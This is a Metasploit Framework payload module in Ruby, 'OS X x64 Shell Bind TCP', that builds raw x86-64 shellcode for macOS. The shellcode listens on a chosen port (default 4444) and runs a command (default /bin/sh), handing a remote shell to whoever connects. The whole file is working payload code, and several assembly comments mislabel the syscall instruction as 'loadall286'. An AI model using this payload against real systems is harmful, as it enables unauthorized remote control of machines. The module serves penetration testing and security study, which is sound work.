##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::BindTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X x64 Shell Bind TCP',
      'Description'   => 'Bind an arbitrary command to an arbitrary port',
      'Author'        => 'nemo <nemo[at]felinemenace.org>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))

    # exec payload options
    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
        Opt::LPORT(4444)
    ], self.class)
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    cmd  = (datastore['CMD'] || '') << "\x00"
    port = [datastore['LPORT'].to_i].pack('n')
    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\xB8\x61\x00\x00\x02" +     # mov eax,0x2000061
      "\x6A\x02" +                 # push byte 0x1
      "\x5f" +                     # pop rdi
      "\x6A\x01" +                 # push byte 0x1
      "\x5e" +                     # pop rsi
      "\x48\x31\xD2" +             # xor rdx,rdx
      "\x0F\x05" +                 # loadall286
      "\x48\x89\xC7" +             # mov rdi,rax
      "\xB8\x68\x00\x00\x02" +     # mov eax,0x2000068
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x56" +                     # push rsi
      "\xBE\x00\x02" + port +      # mov esi,0xb3150200
      "\x56" +                     # push rsi
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x6A\x10" +                 # push 0x10
      "\x5A" +                     # pop rdx
      "\x0F\x05" +                 # loadall286
      "\xB8\x6A\x00\x00\x02" +     # mov eax,0x200006a
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x48\xFF\xC6" +             # inc rsi
      "\x49\x89\xFC" +             # mov r12,rdi
      "\x0F\x05" +                 # loadall286
      "\xB8\x1E\x00\x00\x02" +     # mov eax,0x200001e
      "\x4C\x89\xE7" +             # mov rdi,r12
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x48\x89\xE2" +             # mov rdx,rsp
      "\x48\x83\xEA\x04" +         # sub rdx,byte +0x4
      "\x0F\x05" +                 # loadall286
      "\x48\x89\xC7" +             # mov rdi,rax
      "\xB8\x5A\x00\x00\x02" +     # mov eax,0x200005a
      "\x48\x31\xF6" +             # xor rsi,rsi
      "\x0F\x05" +                 # loadall286
      "\xB8\x5A\x00\x00\x02" +     # mov eax,0x200005a
      "\x48\xFF\xC6" +             # inc rsi
      "\x0F\x05" +                 # loadall286
      "\x48\x31\xC0" +             # xor rax,rax
      "\xB8\x3B\x00\x00\x02" +     # mov eax,0x200003b
      call +                       # call CMD.len
      cmd +                        # CMD
      "\x48\x8b\x3c\x24" +         # mov rdi, [rsp]
      "\x48\x31\xD2" +             # xor rdx,rdx
      "\x52" +                     # push rdx
      "\x57" +                     # push rdi
      "\x48\x89\xE6" +             # mov rsi,rsp
      "\x0F\x05"                   # loadall286
  end
end
